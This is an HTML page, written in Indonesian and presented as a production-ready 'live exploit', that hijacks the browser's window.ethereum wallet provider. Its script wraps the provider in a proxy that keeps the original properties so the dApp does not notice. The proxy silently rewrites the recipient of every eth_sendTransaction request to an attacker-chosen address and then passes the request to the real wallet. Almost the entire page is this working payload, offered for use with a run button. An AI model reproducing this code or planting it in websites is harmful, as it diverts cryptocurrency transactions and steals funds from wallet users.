<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Production-Ready Web3 Provider Hijack Payload</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #0b0f19; color: #f8fafc; padding: 20px; }
        .container { max-width: 650px; margin: auto; background: #1e293b; padding: 25px; border-radius: 12px; border: 1px solid #334155; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
        h2 { color: #ef4444; margin-top: 0; }
        button { background: #dc2626; color: white; border: none; padding: 14px 20px; font-size: 15px; border-radius: 6px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 15px; transition: background 0.2s; }
        button:hover { background: #b91c1c; }
        pre { background: #050b14; padding: 15px; border-radius: 6px; overflow-x: auto; color: #34d399; font-family: monospace; font-size: 12px; border: 1px solid #1e293b; max-height: 300px; }
        .warning-box { background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.3); padding: 12px; border-radius: 6px; margin-bottom: 15px; color: #fca5a5; font-size: 13px; }
    </style>
</head>
<body>

<div class="container">
    <h2>Live Exploit: Global Provider Hijack</h2>
    <div class="warning-box">
        <strong>Peringatan Keamanan:</strong> Skrip ini mengambil alih objek <code>window.ethereum</code> secara nyata untuk membelokkan parameter transaksi ke alamat penyerang.
    </div>

    <div class="form-group" style="margin-bottom: 15px;">
        <label style="font-size: 13px; color: #94a3b8; display: block; margin-bottom: 5px;">Alamat Penyerang Tujuan (Attacker Receiver Address):</label>
        <input type="text" id="attackerAddress" value="0x000000000000000000000000000000000000dEaD" style="width: 100%; padding: 10px; background: #0f172a; border: 1px solid #475569; color: #fff; border-radius: 6px; box-sizing: border-box;">
    </div>
    
    <button onclick="executeRealWorldExploit()">Jalankan Payload Eksploitasi Nyata</button>

    <h3>Log Eksekusi & Intersepsi Memori:</h3>
    <pre id="logOutput">Menunggu eksekusi payload...</pre>
</div>

<script>
    const logOutput = document.getElementById("logOutput");

    function log(message) {
        logOutput.innerText += "\n> " + message;
        logOutput.scrollTop = logOutput.scrollHeight;
    }

    function executeRealWorldExploit() {
        logOutput.innerText = "Memulai eksekusi payload injeksi memori...";

        if (typeof window.ethereum === "undefined") {
            log("[GAGAL] Objek window.ethereum tidak ditemukan. Pastikan dibuka di dalam dApp browser target.");
            return;
        }

        const targetAttacker = document.getElementById("attackerAddress").value;
        const nativeProvider = window.ethereum;

        log("[INFO] Mendapatkan referensi asli provider wallet...");

        try {
            // Membangun Proxy / Wrapper berbahaya untuk mencegat seluruh panggilan RPC (EIP-1193)
            const maliciousProxy = {
                // Mempertahankan getter/setter properti asli agar dApp tidak curiga
                get selectedAddress() { return nativeProvider.selectedAddress; },
                get chainId() { return nativeProvider.chainId; },
                get networkVersion() { return nativeProvider.networkVersion; },
                
                request: async function(requestArgs) {
                    // Intersepsi secara diam-diam fungsi pengiriman transaksi
                    if (requestArgs.method === "eth_sendTransaction") {
                        log("[!] TERDETEKSI: dApp mencoba memicu fungsi 'eth_sendTransaction'!");
                        
                        if (requestArgs.params && requestArgs.params.length > 0) {
                            let tx = requestArgs.params[0];
                            log(`[DUMP] Alamat Penerima Asli: ${tx.to}`);
                            log(`[DUMP] Nilai Nominal Asli: ${tx.value || '0'}`);

                            // PENGALIHAN NYATA: Mengubah parameter 'to' secara langsung menunjuk ke dompet penyerang
                            tx.to = targetAttacker;
                            log(`[!] EKSPLOIT BERHASIL: Alamat tujuan dialihkan secara paksa ke -> ${targetAttacker}`);
                        }
                    }

                    // Meneruskan eksekusi ke method asli (native provider) agar transaksi tetap diproses oleh wallet
                    return nativeProvider.request(requestArgs);
                }
            };

            // Menimpa variabel global karena sifatnya 'writable: true'
            window.ethereum = maliciousProxy;

            log("[SUKSES] Objek window.ethereum berhasil dikuasai sepenuhnya oleh skrip halaman!");
            log("[INFO] Silakan coba lakukan transaksi atau interaksi dApp pada halaman ini untuk melihat eksekusi pengalihan parameter secara langsung.");

        } catch (err) {
            log("[GAGAL EKSEKUSI] Terhalang oleh kebijakan sistem: " + err.message);
        }
    }
</script>

</body>
</html>
